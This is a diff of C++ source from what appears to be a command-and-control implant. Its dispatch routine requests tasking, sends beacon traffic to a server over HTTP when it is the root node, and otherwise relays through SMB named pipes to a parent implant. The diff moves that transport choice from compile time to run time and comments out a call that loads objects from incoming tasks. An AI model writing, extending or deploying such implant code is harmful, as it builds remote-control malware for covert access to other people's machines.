@@ -164,32 +164,35 @@ namespace Dispatcher {
     }
 
     VOID DispatchRoutine() {
-        retry:
-
-        if (!Ctx->transport.outbound_queue) {
-#ifdef TRANSPORT_SMB
-
-            nstatus = ERROR_SUCCESS;
-            return;
-#else
-            Dispatcher::MessageQueue(Stream::CreateStreamWithHeaders(TypeTasking));
-            goto retry;
-#endif
-        }
 
         _stream *out    = Stream::CreateStream();
         _stream *in     = { };
 
-        Dispatcher::PrepareEgress(out);
+        retry:
 
-#ifdef TRANSPORT_HTTP
-        Network::Http::HttpCallback(out, &in);
-#else
-        x_assert(Network::Smb::PipeSend(out));
-        x_assert(Network::Smb::PipeReceive(&in));
-#endif
+        if (!Ctx->transport.outbound_queue) {
+            if (ROOT_NODE) {
+                MessageQueue(Stream::CreateStreamWithHeaders(TypeTasking));
+                goto retry;
+            }
+            else {
+                ntstatus = ERROR_SUCCESS;
+                return;
+            }
+        }
+
+        PrepareEgress(out);
+
+        if (ROOT_NODE) {
+            Network::Http::HttpCallback(out, &in);
+        }
+        else {
+            x_assert(Network::Smb::PipeSend(out));
+            x_assert(Network::Smb::PipeReceive(&in));
+        }
+
         Stream::DestroyStream(out);
-        Dispatcher::PrepareIngress(in);
+        PrepareIngress(in);
         Clients::PushClients();
 
         defer:
@@ -223,7 +226,7 @@ namespace Dispatcher {
 
             case TypeObject:
 
-                Objects::LoadObject(parser);
+                //Objects::LoadObject(parser);
                 break;
 
             default:
